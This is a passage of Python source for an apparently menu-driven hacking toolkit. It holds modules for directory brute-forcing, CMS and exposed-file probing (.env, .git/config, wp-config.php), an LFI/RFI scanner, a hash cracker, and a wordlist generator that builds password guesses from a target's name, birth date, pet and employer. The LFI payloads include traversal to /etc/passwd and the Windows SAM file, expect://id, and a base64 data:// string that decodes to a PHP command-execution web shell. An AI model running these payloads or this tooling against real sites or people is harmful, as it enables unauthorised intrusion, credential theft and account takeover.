            ui.table("XSS Found", ["Type", "Payload", "Result"], rows)
        else:
            ui.success("No XSS vulnerabilities detected")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def dir_bruteforce():
        """Directory brute force"""
        ui.clear()
        ui.banner()
        ui.hacker("DIRECTORY BRUTE FORCE")
        
        url = input(f"\n{c.YELLOW}Enter target URL: {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        url = url.rstrip('/')
        
        # Extended wordlist
        wordlist = [
            # Admin
            'admin', 'administrator', 'admin.php', 'admin.html', 'admin/login',
            'admincp', 'adminpanel', 'webadmin', 'sysadmin', 'moderator',
            # Auth
            'login', 'login.php', 'signin', 'sign-in', 'auth', 'authenticate',
            'logout', 'register', 'signup', 'password', 'forgot-password',
            # Backups
            'backup', 'backup.zip', 'backup.sql', 'backup.tar.gz', 'backups',
            'old', 'new', 'archive', 'bak', 'backup-db',
            # Config
            'config', 'config.php', 'configuration.php', 'config.yml', 'config.json',
            'settings', 'settings.php', 'setup', 'install', 'install.php',
            # CMS
            'wp-admin', 'wp-login.php', 'wp-content', 'wp-includes', 'wp-config.php',
            'wp-admin.css', 'xmlrpc.php', 'wp-json',
            'administrator', 'components', 'templates', 'images', 'media',
            # Database
            'phpmyadmin', 'pma', 'mysql', 'myadmin', 'adminer.php', 'adminer',
            'db', 'database', 'dbadmin', 'mysql-admin',
            # API
            'api', 'api/v1', 'api/v2', 'api/v3', 'graphql', 'swagger', 'docs',
            'redoc', 'openapi.json', 'api-docs',
            # Uploads
            'uploads', 'upload', 'files', 'images', 'img', 'assets', 'static',
            'media', 'documents', 'downloads', 'assets',
            # Hidden
            '.git', '.gitignore', '.env', '.svn', '.htaccess', '.htpasswd',
            '.git/config', '.git/HEAD', 'robots.txt', 'sitemap.xml',
            # Info
            'README.md', 'readme.txt', 'CHANGELOG', 'changelog.txt', 'LICENSE',
            'info.php', 'phpinfo.php', 'test.php', 'debug', 'status',
            # Dev
            'test', 'testing', 'debug', 'temp', 'tmp', 'dev', 'staging', 'beta',
            'alpha', 'sandbox', 'demo', 'sample',
            # Errors
            'error', '404', '500', '403', '400', 'error.html', 'error.php',
            # Server
            'server-status', 'server-info', '.well-known', 'crossdomain.xml',
            'clientaccesspolicy.xml', 'favicon.ico', 'apple-touch-icon.png',
        ]
        
        found = []
        ui.info(f"Testing {len(wordlist)} paths...")
        
        for path in ui.progress("Scanning", len(wordlist), wordlist):
            test_url = f"{url}/{path}"
            try:
                req = urllib.request.Request(test_url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                response = urllib.request.urlopen(req, timeout=5)
                if response.status in [200, 301, 302, 403]:
                    found.append((path, response.status, "Found"))
            except urllib.error.HTTPError as e:
                if e.code in [200, 301, 302, 403]:
                    found.append((path, e.code, "Found"))
            except:
                pass
                
        if found:
            ui.success(f"Found {len(found)} paths")
            rows = [[f"/{p}", str(s), r] for p, s, r in found]
            ui.table("Discovered Paths", ["Path", "Status", "Result"], rows)
        else:
            ui.warning("No paths found")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def header_analyzer():
        """HTTP Security Header Analyzer"""
        ui.clear()
        ui.banner()
        ui.hacker("HEADER ANALYZER")
        
        url = input(f"\n{c.YELLOW}Enter target URL: {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        if not url.startswith('http'):
            url = 'https://' + url
            
        animator.spinner_animation(1, "Analyzing headers")
        
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response = urllib.request.urlopen(req, timeout=10)
            headers = dict(response.headers)
            
            # Security headers check
            security_headers = {
                'X-Frame-Options': {'desc': 'Clickjacking protection', 'recommended': 'DENY or SAMEORIGIN'},
                'X-Content-Type-Options': {'desc': 'MIME sniffing protection', 'recommended': 'nosniff'},
                'X-XSS-Protection': {'desc': 'XSS filter', 'recommended': '1; mode=block'},
                'Strict-Transport-Security': {'desc': 'HTTPS enforcement', 'recommended': 'max-age=31536000'},
                'Content-Security-Policy': {'desc': 'XSS/injection prevention', 'recommended': 'default-src self'},
                'Referrer-Policy': {'desc': 'Referrer control', 'recommended': 'strict-origin'},
                'Permissions-Policy': {'desc': 'Feature control', 'recommended': 'Custom policy'},
                'Cross-Origin-Opener-Policy': {'desc': 'Cross-origin isolation', 'recommended': 'same-origin'},
                'Cross-Origin-Resource-Policy': {'desc': 'Cross-origin resource control', 'recommended': 'same-origin'},
                'Feature-Policy': {'desc': 'Feature control (deprecated)', 'recommended': 'Custom policy'},
            }
            
            results = []
            score = 0
            for header, info in security_headers.items():
                if header in headers:
                    results.append([header, '✓ Present', headers[header][:40], 'Good'])
                    score += 1
                else:
                    results.append([header, '✗ Missing', info['recommended'], 'Warning'])
                    
            ui.table("Security Headers Analysis", ["Header", "Status", "Value/Recommended", "Rating"], results)
            
            # Security score
            pct = int((score / len(security_headers)) * 100)
            if pct >= 80:
                ui.success(f"Security Score: {pct}% - Good")
            elif pct >= 50:
                ui.warning(f"Security Score: {pct}% - Moderate")
            else:
                ui.error(f"Security Score: {pct}% - Poor")
                
            # Show all headers
            print(f"\n{c.CYAN}All Response Headers:{c.RESET}")
            for k, v in headers.items():
                print(f"  {c.YELLOW}{k}:{c.RESET} {v}")
                
        except Exception as e:
            ui.error(f"Error: {e}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def tech_detector():
        """Technology stack detector"""
        ui.clear()
        ui.banner()
        ui.hacker("TECHNOLOGY DETECTOR")
        
        url = input(f"\n{c.YELLOW}Enter target URL: {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        if not url.startswith('http'):
            url = 'https://' + url
            
        animator.spinner_animation(1, "Detecting technologies")
        
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response = urllib.request.urlopen(req, timeout=10)
            headers = dict(response.headers)
            content = response.read().decode('utf-8', errors='ignore')
            
            detected = []
            
            # Server detection
            if 'Server' in headers:
                detected.append(["Server", headers['Server'], "Header"])
                
            # X-Powered-By
            if 'X-Powered-By' in headers:
                detected.append(["Backend", headers['X-Powered-By'], "Header"])
                
            # CMS detection
            cms_patterns = {
                'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
                'Joomla': ['joomla', 'joom', '/components/'],
                'Drupal': ['drupal', 'sites/default/files'],
                'Magento': ['magento', 'mage/'],
                'Shopify': ['shopify', 'cdn.shopify.com'],
                'Wix': ['wix.com', 'wixstatic.com'],
                'Squarespace': ['squarespace', 'sqsp'],
            }
            
            for cms, patterns in cms_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in content.lower():
                        detected.append(["CMS", cms, "Content"])
                        break
                        
            # Framework detection
            framework_patterns = {
                'React': ['react', 'react-dom', '__REACT'],
                'Vue.js': ['vue.js', 'vue.min', 'Vue'],
                'Angular': ['angular', 'ng-', 'angular.js'],
                'jQuery': ['jquery', 'jQuery'],
                'Bootstrap': ['bootstrap', 'Bootstrap'],
                'Laravel': ['laravel', 'Laravel'],
                'Django': ['django', 'csrfmiddlewaretoken'],
                'Rails': ['rails', 'ruby'],
                'Express': ['express'],
                'Next.js': ['__NEXT_DATA', 'next/'],
                'Nuxt.js': ['__NUXT__', 'nuxt'],
            }
            
            for fw, patterns in framework_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in content.lower():
                        detected.append(["Framework", fw, "Content"])
                        break
                        
            # Analytics
            analytics = {
                'Google Analytics': ['google-analytics.com', 'gtag', 'ga.js', 'analytics.js'],
                'Google Tag Manager': ['googletagmanager.com', 'gtm.js'],
                'Facebook Pixel': ['connect.facebook.net', 'fbq'],
                'Hotjar': ['hotjar.com', 'hj.js'],
                'Mixpanel': ['mixpanel.com', 'mixpanel'],
            }
            
            for name, patterns in analytics.items():
                for pattern in patterns:
                    if pattern.lower() in content.lower():
                        detected.append(["Analytics", name, "Content"])
                        break
                        
            if detected:
                ui.success(f"Detected {len(detected)} technologies")
                ui.table("Technology Stack", ["Category", "Technology", "Detection Method"], detected)
            else:
                ui.warning("No technologies detected")
                
        except Exception as e:
            ui.error(f"Error: {e}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def lfi_scanner():
        """Local/Remote File Inclusion scanner"""
        ui.clear()
        ui.banner()
        ui.hacker("LFI/RFI SCANNER")
        
        url = input(f"\n{c.YELLOW}Enter target URL (with ?file= or ?page= parameter): {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        # LFI payloads
        lfi_payloads = [
            ("Basic", "/etc/passwd"),
            ("Traversal (2)", "../../etc/passwd"),
            ("Traversal (4)", "../../../etc/passwd"),
            ("Traversal (6)", "../../../../etc/passwd"),
            ("Traversal (8)", "../../../../../etc/passwd"),
            ("Null Byte", "/etc/passwd%00"),
            ("Double Null", "/etc/passwd%00%00"),
            ("URL Encoded", "%2fetc%2fpasswd"),
            ("Double Encode", "%252fetc%252fpasswd"),
            ("Wrapper PHP", "php://filter/convert.base64-encode/resource=index.php"),
            ("Wrapper Expect", "expect://id"),
            ("Wrapper Input", "php://input"),
            ("Wrapper Data", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"),
            ("Log Poisoning", "/var/log/apache2/access.log"),
            ("SSH Log", "/var/log/auth.log"),
            ("Windows Boot", "C:\\boot.ini"),
            ("Windows System", "C:\\windows\\system32\\config\\sam"),
            ("Windows Hosts", "C:\\windows\\system32\\drivers\\etc\\hosts"),
        ]
        
        vulnerable = []
        ui.info(f"Testing {len(lfi_payloads)} LFI payloads...")
        
        for name, payload in ui.progress("Scanning", len(lfi_payloads), lfi_payloads):
            test_url = url.replace('=', '=' + payload) if '=' in url else url + payload
            try:
                req = urllib.request.Request(test_url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                response = urllib.request.urlopen(req, timeout=10)
                content = response.read().decode('utf-8', errors='ignore')
                
                # Check for LFI indicators
                indicators = ['root:', 'nobody:', 'daemon:', '[boot loader]', '[fonts]', '127.0.0.1 localhost']
                for indicator in indicators:
                    if indicator in content:
                        vulnerable.append((name, payload[:30], indicator))
                        break
                        
            except urllib.error.HTTPError as e:
                if e.code == 500:
                    # Server error might indicate partial success
                    try:
                        content = e.read().decode('utf-8', errors='ignore')
                        if 'root:' in content or 'nobody:' in content:
                            vulnerable.append((name, payload[:30], "HTTP 500 + indicator"))
                    except:
                        pass
            except:
                pass
                
        if vulnerable:
            ui.error("VULNERABLE: LFI detected!")
            rows = [[n, p, e] for n, p, e in vulnerable]
            ui.table("LFI Vulnerabilities", ["Type", "Payload", "Evidence"], rows)
        else:
            ui.success("No LFI vulnerabilities detected")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def cms_scanner():
        """CMS vulnerability scanner"""
        ui.clear()
        ui.banner()
        ui.hacker("CMS VULNERABILITY SCANNER")
        
        url = input(f"\n{c.YELLOW}Enter target URL: {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        if not url.startswith('http'):
            url = 'https://' + url
            
        animator.spinner_animation(1, "Scanning CMS")
        
        detected_cms = []
        vulnerabilities = []
        
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response = urllib.request.urlopen(req, timeout=10)
            headers = dict(response.headers)
            content = response.read().decode('utf-8', errors='ignore')
            
            # WordPress detection
            wp_indicators = ['wp-content', 'wp-includes', 'wp-json', 'wordpress', '/xmlrpc.php']
            wp_count = sum(1 for ind in wp_indicators if ind.lower() in content.lower())
            if wp_count >= 2:
                detected_cms.append(["CMS", "WordPress", f"{wp_count} indicators"])
                
                # Check WordPress vulnerabilities
                wp_paths = [
                    '/wp-admin/', '/wp-login.php', '/xmlrpc.php', 
                    '/wp-config.php', '/.wp-config.php.swp',
                    '/wp-content/debug.log', '/wp-includes/',
                ]
                
                for path in wp_paths:
                    try:
                        test_url = url.rstrip('/') + path
                        req2 = urllib.request.Request(test_url, headers={
                            'User-Agent': 'Mozilla/5.0'
                        })
                        resp = urllib.request.urlopen(req2, timeout=5)
                        if resp.status == 200:
                            vulnerabilities.append(["WordPress", path, "Accessible"])
                    except urllib.error.HTTPError as e:
                        if e.code == 403:
                            vulnerabilities.append(["WordPress", path, "403 Forbidden"])
                    except:
                        pass
                        
            # Joomla detection
            joomla_indicators = ['joomla', 'media/jui', 'components/com_', '/administrator/']
            joomla_count = sum(1 for ind in joomla_indicators if ind.lower() in content.lower())
            if joomla_count >= 2:
                detected_cms.append(["CMS", "Joomla", f"{joomla_count} indicators"])
                
            # Drupal detection
            drupal_indicators = ['drupal', 'sites/default', 'Drupal.settings', '/user/login']
            drupal_count = sum(1 for ind in drupal_indicators if ind.lower() in content.lower())
            if drupal_count >= 2:
                detected_cms.append(["CMS", "Drupal", f"{drupal_count} indicators"])
                
                # Check Drupal vulnerabilities
                drupal_paths = ['/user/login', '/admin/config', '/xmlrpc.php', '/CHANGELOG.txt']
                for path in drupal_paths:
                    try:
                        test_url = url.rstrip('/') + path
                        req2 = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                        resp = urllib.request.urlopen(req2, timeout=5)
                        vulnerabilities.append(["Drupal", path, "Accessible"])
                    except:
                        pass
                        
            # Magento detection
            magento_indicators = ['magento', 'mage/', 'skin/frontend', '/checkout/cart']
            magento_count = sum(1 for ind in magento_indicators if ind.lower() in content.lower())
            if magento_count >= 2:
                detected_cms.append(["CMS", "Magento", f"{magento_count} indicators"])
                
            # Generic checks
            generic_paths = [
                '/robots.txt', '/sitemap.xml', '/.git/config', '/.env',
                '/backup.sql', '/backup.zip', '/admin', '/login',
                '/phpinfo.php', '/info.php', '/server-status',
            ]
            
            for path in generic_paths:
                try:
                    test_url = url.rstrip('/') + path
                    req2 = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                    resp = urllib.request.urlopen(req2, timeout=5)
                    content2 = resp.read().decode('utf-8', errors='ignore')
                    
                    # Check for sensitive info
                    if 'git' in path and '[core]' in content2:
                        vulnerabilities.append(["Sensitive", path, "Git config exposed"])
                    elif '.env' in path and ('DB_' in content2 or 'API_' in content2):
                        vulnerabilities.append(["Sensitive", path, "Env file exposed"])
                    elif 'phpinfo' in path and 'PHP Version' in content2:
                        vulnerabilities.append(["Sensitive", path, "PHP info exposed"])
                    else:
                        vulnerabilities.append(["Info", path, "Accessible"])
                except:
                    pass
                    
            if detected_cms:
                ui.success(f"Detected CMS")
                ui.table("CMS Detection", ["Category", "CMS", "Evidence"], detected_cms)
            else:
                ui.warning("No known CMS detected")
                
            if vulnerabilities:
                ui.warning(f"Found {len(vulnerabilities)} potential issues")
                ui.table("Vulnerabilities/Findings", ["Type", "Path", "Status"], vulnerabilities[:20])
                
        except Exception as e:
            ui.error(f"Error: {e}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# PASSWORD ATTACKS MODULE
# ============================================================================

class PasswordAttacks:
    """Password attack tools"""
    
    MODULE_NAME = "Password Attacks"
    MODULE_DESC = "Brute force, hash cracking, wordlist generator"
    
    @staticmethod
    def hash_cracker():
        """Hash cracker with multiple algorithms"""
        ui.clear()
        ui.banner()
        ui.hacker("HASH CRACKER")
        
        print(f"\n{c.CYAN}Supported hash types:{c.RESET}")
        print(f"  {c.YELLOW}1.{c.RESET} MD5")
        print(f"  {c.YELLOW}2.{c.RESET} SHA-1")
        print(f"  {c.YELLOW}3.{c.RESET} SHA-256")
        print(f"  {c.YELLOW}4.{c.RESET} SHA-512")
        print(f"  {c.YELLOW}5.{c.RESET} Auto-detect")
        
        choice = input(f"\n{c.YELLOW}Select hash type: {c.RESET}").strip()
        
        hash_str = input(f"{c.YELLOW}Enter hash: {c.RESET}").strip()
        if not hash_str:
            ui.error("No hash specified")
            return
            
        wordlist_path = input(f"{c.YELLOW}Wordlist path (Enter for built-in): {c.RESET}").strip()
        
        # Extended built-in wordlist
        common_passwords = [
            'password', '123456', '12345678', 'qwerty', 'abc123',
            'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
            'baseball', 'iloveyou', 'master', 'sunshine', 'ashley',
            'bailey', 'shadow', '123123', '654321', 'superman',
            'qazwsx', 'michael', 'football', 'password1', 'password123',
            'admin', 'admin123', 'root', 'toor', 'guest',
            'test', 'test123', 'welcome', 'welcome1', 'changeme',
            'pass', 'pass123', 'pass1234', 'letmein', 'login',
            'administrator', 'adminadmin', 'admin@123', 'Admin123',
            'P@ssw0rd', 'P@ssword', 'Password1!', 'Welcome1',
            '1234567890', '123456789', '12345', '1234', '123',
            'qwerty123', 'qwertyuiop', 'asdfgh', 'zxcvbn',
            '1q2w3e4r', '1qaz2wsx', '!@#$%^&*',
        ]
        
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            ui.info(f"Loaded {len(passwords)} passwords from wordlist")
        else:
            passwords = common_passwords
            ui.info(f"Using built-in wordlist ({len(passwords)} passwords)")
            
        # Determine hash type
        hash_funcs = {
            '1': ('MD5', hashlib.md5),
            '2': ('SHA-1', hashlib.sha1),
            '3': ('SHA-256', hashlib.sha256),
            '4': ('SHA-512', hashlib.sha512),
        }
        
        if choice == '5':
            # Auto-detect based on length
            hash_len = len(hash_str)
            if hash_len == 32:
                hash_name, hash_func = 'MD5', hashlib.md5
            elif hash_len == 40:
                hash_name, hash_func = 'SHA-1', hashlib.sha1
            elif hash_len == 64:
                hash_name, hash_func = 'SHA-256', hashlib.sha256
            elif hash_len == 128:
                hash_name, hash_func = 'SHA-512', hashlib.sha512
            else:
                ui.error(f"Unknown hash length: {hash_len}")
                return
            ui.info(f"Auto-detected: {hash_name}")
        else:
            hash_name, hash_func = hash_funcs.get(choice, ('MD5', hashlib.md5))
            
        ui.info(f"Cracking with {hash_name}...")
        animator.spinner_animation(0.5, "Starting")
        
        for password in ui.progress("Cracking", len(passwords), passwords):
            hashed = hash_func(password.encode()).hexdigest()
            if hashed == hash_str.lower():
                ui.success(f"PASSWORD FOUND: {password}")
                input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
                return
                
        ui.error("Password not found in wordlist")
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def hash_identifier():
        """Identify hash type"""
        ui.clear()
        ui.banner()
        ui.hacker("HASH IDENTIFIER")
        
        hash_str = input(f"\n{c.YELLOW}Enter hash: {c.RESET}").strip()
        if not hash_str:
            ui.error("No hash specified")
            return
            
        # Hash types by length and pattern
        hash_types = [
            (32, 'MD5', r'^[a-f0-9]{32}$'),
            (32, 'NTLM', r'^[a-f0-9]{32}$'),
            (40, 'SHA-1', r'^[a-f0-9]{40}$'),
            (56, 'SHA-224', r'^[a-f0-9]{56}$'),
            (64, 'SHA-256', r'^[a-f0-9]{64}$'),
            (96, 'SHA-384', r'^[a-f0-9]{96}$'),
            (128, 'SHA-512', r'^[a-f0-9]{128}$'),
            (34, 'MD5 (Unix)', r'^\$1\$'),
            (34, 'Blowfish', r'^\$2[axy]?\$'),
            (64, 'SHA-256 (Unix)', r'^\$5\$'),
            (106, 'SHA-512 (Unix)', r'^\$6\$'),
            (64, 'SHA-256 (Django)', r'^sha256\$'),
            (128, 'SHA-512 (Django)', r'^sha512\$'),
            (64, 'HMAC-SHA256', r'^[a-f0-9]{64}$'),
            (24, 'Base64', r'^[A-Za-z0-9+/]+=*$'),
        ]
        
        results = []
        hash_len = len(hash_str)
        
        for length, name, pattern in hash_types:
            if hash_len == length or hash_str.startswith(pattern[:3]):
                if re.match(pattern, hash_str, re.IGNORECASE):
                    results.append([name, str(length), "Possible match"])
                    
        if results:
            ui.table("Possible Hash Types", ["Algorithm", "Length", "Match"], results)
        else:
            ui.warning("Unknown hash type")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def wordlist_generator():
        """Generate custom wordlist"""
        ui.clear()
        ui.banner()
        ui.hacker("WORDLIST GENERATOR")
        
        print(f"\n{c.CYAN}Enter target information (leave blank if unknown):{c.RESET}")
        
        name = input(f"{c.YELLOW}Name: {c.RESET}").strip()
        dob = input(f"{c.YELLOW}Date of birth (DD/MM/YYYY): {c.RESET}").strip()
        pet = input(f"{c.YELLOW}Pet name: {c.RESET}").strip()
        company = input(f"{c.YELLOW}Company: {c.RESET}").strip()
        hobbies = input(f"{c.YELLOW}Hobbies (comma-separated): {c.RESET}").strip()
        extra = input(f"{c.YELLOW}Extra words: {c.RESET}").strip()
        
        words = []
        
        if name:
            words.extend([name, name.lower(), name.upper(), name.capitalize()])
            # Leet speak variations
            leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'}
            leet = name.lower()
            for char, replacement in leet_map.items():
                leet = leet.replace(char, replacement)
            words.append(leet)
            
        if dob:
            parts = dob.replace('/', ' ').replace('-', ' ').split()
            words.extend(parts)
            if len(parts) == 3:
                words.extend([parts[2], parts[2][-2:]])
                
        if pet:
            words.extend([pet, pet.lower(), pet.upper()])
            
        if company:
            words.extend([company, company.lower(), company.upper()])
            
        if hobbies:
            for h in hobbies.split(','):
                h = h.strip()
                if h:
                    words.extend([h, h.lower(), h.upper()])
                    
        if extra:
            for e in extra.split(','):
                e = e.strip()
                if e:
                    words.extend([e, e.lower(), e.upper()])
                    
        # Generate combinations
        passwords = set()
        passwords.update(words)
        
        # Add numbers and symbols
        suffixes = ['', '1', '12', '123', '1234', '12345', '!', '!1', '!@#', '@', '#', '$',
                    '2023', '2024', '2025', '2026', '01', '02', '007']
                    
        for word in words:
            for suffix in suffixes:
                passwords.add(f"{word}{suffix}")
                passwords.add(f"{suffix}{word}")
                
        # Combine words
        for w1 in words[:5]:
            for w2 in words[:5]:
                if w1 != w2:
                    passwords.add(f"{w1}{w2}")
                    passwords.add(f"{w1}_{w2}")
                    passwords.add(f"{w1}-{w2}")
                    passwords.add(f"{w1}.{w2}")
                    
        passwords = [p for p in passwords if p]
        
        output_path = input(f"\n{c.YELLOW}Output file (default: wordlist.txt): {c.RESET}").strip() or "wordlist.txt"
        
        with open(output_path, 'w') as f:
            for p in sorted(passwords):
                f.write(p + '\n')
                
        ui.success(f"Generated {len(passwords)} passwords -> {output_path}")
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def password_strength():
        """Check password strength"""
        ui.clear()
        ui.banner()
        ui.hacker("PASSWORD STRENGTH CHECKER")
        
        password = input(f"\n{c.YELLOW}Enter password: {c.RESET}").strip()
        if not password:
            ui.error("No password specified")
            return
            
        score = 0
        feedback = []
        
        # Length checks
        if len(password) >= 8:
            score += 1
            feedback.append(["Length >= 8", "✓", "Good"])
        else:
            feedback.append(["Length >= 8", "✗", "Too short"])
            
        if len(password) >= 12:
            score += 1
            feedback.append(["Length >= 12", "✓", "Good"])
            
        if len(password) >= 16:
            score += 1
            feedback.append(["Length >= 16", "✓", "Excellent"])
            
        # Character types
        if re.search(r'[a-z]', password):
            score += 1
            feedback.append(["Lowercase", "✓", "Present"])
        else:
            feedback.append(["Lowercase", "✗", "Missing"])
            
        if re.search(r'[A-Z]', password):
            score += 1
            feedback.append(["Uppercase", "✓", "Present"])
        else:
            feedback.append(["Uppercase", "✗", "Missing"])
            
        if re.search(r'[0-9]', password):
            score += 1
            feedback.append(["Numbers", "✓", "Present"])
        else:
            feedback.append(["Numbers", "✗", "Missing"])
            
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            score += 1
            feedback.append(["Special chars", "✓", "Present"])
        else:
            feedback.append(["Special chars", "✗", "Missing"])
            
        # Common passwords check
        common = ['password', '123456', 'qwerty', 'admin', 'letmein', 'welcome']
        if password.lower() in common:
            score = 0
            feedback.append(["Common password", "!", "Very weak!"])
            
        # Calculate strength
        max_score = 8
        pct = int((score / max_score) * 100)
        
        if pct <= 25:
            strength = "VERY WEAK"
            color = c.RED
        elif pct <= 50:
            strength = "WEAK"
            color = c.RED
        elif pct <= 75:
            strength = "MODERATE"
            color = c.YELLOW
        else:
            strength = "STRONG"
            color = c.GREEN
            
        print(f"\n{c.BOLD}Password Strength: {color}{strength}{c.RESET}")
        print(f"{c.BOLD}Score: {score}/{max_score} ({pct}%){c.RESET}\n")
        
        ui.table("Analysis", ["Check", "Status", "Result"], feedback)
        
        # Crack time estimate
        charset_size = 0
        if re.search(r'[a-z]', password): charset_size += 26
        if re.search(r'[A-Z]', password): charset_size += 26
        if re.search(r'[0-9]', password): charset_size += 10
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', password): charset_size += 20
        
        combinations = charset_size ** len(password)
        cracks_per_sec = 10000000000  # 10 billion (modern GPU)
        seconds = combinations / cracks_per_sec
        
        if seconds < 60:
            time_str = f"{seconds:.1f} seconds"
        elif seconds < 3600:
            time_str = f"{seconds/60:.1f} minutes"
        elif seconds < 86400:
            time_str = f"{seconds/3600:.1f} hours"
        elif seconds < 31536000:
            time_str = f"{seconds/86400:.1f} days"
        else:
            time_str = f"{seconds/31536000:.1f} years"
            
        ui.info(f"Estimated crack time: {time_str}")
        
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# INFORMATION GATHERING MODULE
# ============================================================================

class InfoGathering:
    """Information gathering tools"""
    
    MODULE_NAME = "Information Gathering"
    MODULE_DESC = "OSINT, subdomain enumeration, WHOIS, DNS"
    
    @staticmethod
    def dns_lookup():
        """DNS lookup"""
        ui.clear()
        ui.banner()
        ui.hacker("DNS LOOKUP")
        
        domain = input(f"\n{c.YELLOW}Enter domain: {c.RESET}").strip()
        if not domain:
            ui.error("No domain specified")
            return
            
        domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        results = []
        
        for rtype in record_types:
            try:
                if platform.system().lower() == 'windows':
                    result = subprocess.run(
                        ['nslookup', '-type=' + rtype, domain],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    output = result.stdout
                else:
                    result = subprocess.run(
                        ['dig', domain, rtype, '+short'],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    output = result.stdout
                    
                if output.strip():
                    for line in output.strip().split('\n'):
                        if line.strip() and 'server' not in line.lower():
                            results.append([rtype, line.strip()[:80]])
            except:
                pass
                
        if results:
            ui.table("DNS Records", ["Type", "Value"], results)
        else:
            ui.warning("No DNS records found")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def subdomain_finder():
        """Subdomain finder"""
        ui.clear()
        ui.banner()
        ui.hacker("SUBDOMAIN FINDER")
        
        domain = input(f"\n{c.YELLOW}Enter domain: {c.RESET}").strip()
        if not domain:
            ui.error("No domain specified")
            return
            
        domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
        
        # Extended subdomain list
        subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'ns2',
            'vpn', 'admin', 'portal', 'ssh', 'remote', 'blog', 'dev', 'staging',
            'api', 'test', 'beta', 'alpha', 'demo', 'cdn', 'static', 'assets',
            'app', 'apps', 'm', 'mobile', 'secure', 'login', 'signin', 'auth',
            'shop', 'store', 'ecommerce', 'cart', 'pay', 'payment', 'billing',
            'support', 'help', 'docs', 'wiki', 'forum', 'community', 'chat',
            'news', 'media', 'img', 'images', 'video', 'videos', 'audio',
            'download', 'files', 'uploads', 'backup', 'db', 'database',
            'internal', 'intranet', 'extranet', 'office', 'owa', 'exchange',
            'cloud', 'host', 'server', 'proxy', 'gateway', 'firewall',
            'git', 'svn', 'jenkins', 'ci', 'cd', 'build', 'deploy',
            'status', 'monitor', 'health', 'metrics', 'analytics', 'stats',
            'dashboard', 'panel', 'control', 'manage', 'console',
            'cpanel', 'webdisk', 'autodiscover', 'autoconfig',
            'email', 'imap', 'pop3', 'smtp', 'relay',
            'dev1', 'dev2', 'test1', 'test2', 'uat', 'prod',
            'old', 'new', 'v1', 'v2', 'v3', 'api1', 'api2',
            'sftp', 'rsync', 'backup1', 'backup2',
            'mysql', 'postgres', 'mongo', 'redis', 'elastic',
            'grafana', 'prometheus', 'kibana', 'logstash',
        ]
        
        found = []
        ui.info(f"Testing {len(subdomains)} subdomains...")
        
        for sub in ui.progress("Scanning", len(subdomains), subdomains):
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                found.append([full_domain, ip])
            except:
                pass
                
        if found:
            ui.success(f"Found {len(found)} subdomains")
            ui.table("Subdomains", ["Subdomain", "IP"], found)
        else:
            ui.warning("No subdomains found")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def ip_geolocation():
        """IP geolocation lookup"""
        ui.clear()
        ui.banner()
        ui.hacker("IP GEOLOCATION")
        
        ip = input(f"\n{c.YELLOW}Enter IP address: {c.RESET}").strip()
        if not ip:
            ui.error("No IP specified")
            return
            
        animator.spinner_animation(1, "Looking up IP")
        
        try:
            # Use free IP API
            url = f"http://ip-api.com/json/{ip}"
            req = urllib.request.Request(url, headers={'User-Agent': 'TRAUMA-Scanner/2.0'})
            response = urllib.request.urlopen(req, timeout=10)
            data = json.loads(response.read().decode())
            
            if data.get('status') == 'success':
                results = [
                    ["IP", data.get('query', 'N/A')],
